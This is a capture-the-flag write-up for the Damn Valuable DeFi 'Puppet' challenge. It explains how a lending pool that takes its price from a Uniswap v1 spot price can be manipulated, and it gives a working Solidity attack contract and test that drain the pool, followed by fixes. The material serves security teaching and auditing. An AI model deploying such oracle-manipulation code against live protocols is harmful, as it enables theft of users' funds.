# Puppet

There's a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There's a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.

# Puppet Challenge - Vulnerability Report

## Overview
The Puppet challenge involves a lending pool that allows users to borrow Damn Valuable Tokens (DVTs) by depositing ETH as collateral. The pool uses a Uniswap v1 exchange as a price oracle to determine the required collateral amount. The vulnerability lies in the price oracle mechanism and how it can be manipulated.

## Vulnerability Details

### Severity: Critical
- Impact: High (Loss of all pool funds)
- Likelihood: High (Easy to execute)
- CVSS Score: 9.0

### Root Cause
The vulnerability stems from the lending pool's reliance on the Uniswap v1 exchange as a price oracle. The pool calculates the required collateral using the following formula in `calculateDepositRequired()`:

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

The key issues are:

1. **Manipulable Price Oracle**: The price is calculated directly from the Uniswap v1 pool's reserves without any time-weighted average or other protection mechanisms.

2. **No Slippage Protection**: The pool doesn't implement any slippage protection or minimum liquidity requirements.

3. **Single Source of Truth**: The pool relies solely on the Uniswap v1 pool's reserves for price determination.

## Attack Vector

An attacker can exploit this vulnerability by:

1. Using their initial DVT balance (1000 DVT) to manipulate the Uniswap v1 pool's reserves
2. Swapping a large amount of DVT for ETH in the Uniswap v1 pool
3. This drastically changes the price ratio in the pool
4. The lending pool's price oracle will now return a much lower price
5. The attacker can then borrow all tokens from the lending pool with minimal ETH collateral

## Proof of Concept

```solidity
contract PuppetAttack {
    IUniswapV1Exchange public immutable uniswapV1Exchange;
    PuppetPool public immutable lendingPool;
    DamnValuableToken public immutable token;
    address public immutable recovery;

    constructor(
        address _uniswapV1Exchange,
        address _lendingPool,
        address _token,
        address _recovery
    ) {
        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
        lendingPool = PuppetPool(_lendingPool);
        token = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function attack() external payable {
        // 1. Approve Uniswap v1 exchange to spend our tokens
        token.approve(address(uniswapV1Exchange), token.balanceOf(address(this)));
        
        // 2. Swap all our DVT tokens for ETH
        // This will drastically change the price ratio in the pool
        uniswapV1Exchange.tokenToEthSwapInput(
            token.balanceOf(address(this)),
            1, // min_eth (we don't care about slippage)
            block.timestamp * 2 // deadline
        );
        
        // 3. Now the price oracle will return a much lower price
        // We can borrow all tokens from the lending pool with minimal ETH
        uint256 borrowAmount = token.balanceOf(address(lendingPool));
        uint256 depositRequired = lendingPool.calculateDepositRequired(borrowAmount);
        
        // 4. Borrow all tokens from the lending pool
        lendingPool.borrow{value: depositRequired}(
            borrowAmount,
            recovery
        );

        // 5. Send any remaining ETH back to the player
        if (address(this).balance > 0) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
```

And the test function that executes the attack:

```solidity
function test_puppet() public checkSolvedByPlayer {
    // Deploy the attack contract
    PuppetAttack attack = new PuppetAttack(
        address(uniswapV1Exchange),
        address(lendingPool),
        address(token),
        recovery
    );

    // Transfer all tokens to the attack contract
    token.transfer(address(attack), token.balanceOf(player));

    // Execute the attack
    attack.attack{value: player.balance}();
}
```

## Impact
- The attacker can drain all tokens from the lending pool (100,000 DVT)
- The attack requires minimal ETH collateral due to the manipulated price
- The attack can be executed in a single transaction

## Recommendations

### Short-term Fixes
1. Implement a time-weighted average price (TWAP) oracle instead of using spot prices
2. Add minimum liquidity requirements for the Uniswap pool
3. Implement slippage protection in the price calculation

### Long-term Fixes
1. Use multiple price oracles and aggregate their results
2. Implement circuit breakers for significant price movements
3. Add a minimum time delay between price updates
4. Consider using a more robust DEX like Uniswap v2 or v3 with built-in price protection mechanisms

## References
- [Uniswap v1 Documentation](https://docs.uniswap.org/contracts/v1/overview)
- [Price Oracle Manipulation](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/#price-oracles)
- [ERC4626 Vault Standard](https://eips.ethereum.org/EIPS/eip-4626)
